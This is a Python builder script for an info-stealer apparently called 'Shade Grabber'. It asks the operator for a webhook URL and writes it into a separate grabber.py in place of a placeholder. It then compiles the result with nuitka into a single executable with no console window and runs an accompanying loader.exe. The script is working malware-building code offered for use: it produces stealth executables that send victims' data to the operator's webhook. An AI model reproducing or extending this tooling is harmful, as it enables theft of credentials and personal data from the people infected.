import os
import time
import shutil
import subprocess
import fade
from pystyle import Anime, Colors, Colorate, Center 

os.system("cls")
os.system(f'mode con cols=100 lines=40')

banner = """
     ______           __      _____         __   __          
    / __/ /  ___ ____/ /__   / ___/______ _/ /  / /  ___ ____
   _\ \/ _ \/ _ `/ _  / -_) / (_ / __/ _ `/ _ \/ _ \/ -_) __/
  /___/_//_/\_,_/\_,_/\__/  \___/_/  \_,_/_.__/_.__/\__/_/   
                                                             

"""
os.system("title Shade Grabber")

Anime.Fade(Center.XCenter(banner), Colors.blue_to_purple, Colorate.Vertical, time=1)
faded_text = fade.purpleblue(Center.XCenter(banner))
print(Center.XCenter(faded_text))


output_directory = os.path.join(os.path.dirname(__file__), 'out')
output_dist = os.path.join(os.path.dirname(__file__), 'temp')
output_distt = os.path.join(os.path.dirname(__file__), 'dist')
os.makedirs(output_directory, exist_ok=True)

current_directory = os.path.dirname(os.path.abspath(__file__))

main_path = os.path.join(current_directory, 'src', 'grabber.py')

print(Center.XCenter("Enter your webhook URL:"))
new_hook = input("                  -->")
print("\n")
print(Center.XCenter("Enter output file name (without .py):"))
output_name = input("                  -->")
print("\n")

output_file = os.path.join(output_directory, f"{output_name}.py")
output_e = os.path.join(output_dist, f"{output_name}.exe")

with open(main_path, 'r') as src_file:
    main_code = src_file.read()
    modified_code = main_code.replace("{hoook}", f"'{new_hook}'")

    with open(output_file, 'w') as output:
        output.write(modified_code)

time.sleep(1)

def build():
    try:
        print("\n")
        print(Center.XCenter("Beginning building, please be patient..."))
        print("\n")
        command = f'nuitka --onefile --disable-console --output-dir="{output_dist}" "{output_file}"'

        subprocess.run(command, shell=True)
    except Exception as e:
        print("Exception occurred:", e)
        print("please report this error")

if __name__ == "__main__":
    build()
    subprocess.run(["explorer", output_distt], shell=True)
    comm = f'loader.exe "{output_e}'
    os.system(comm)
    os.remove("execute.js")

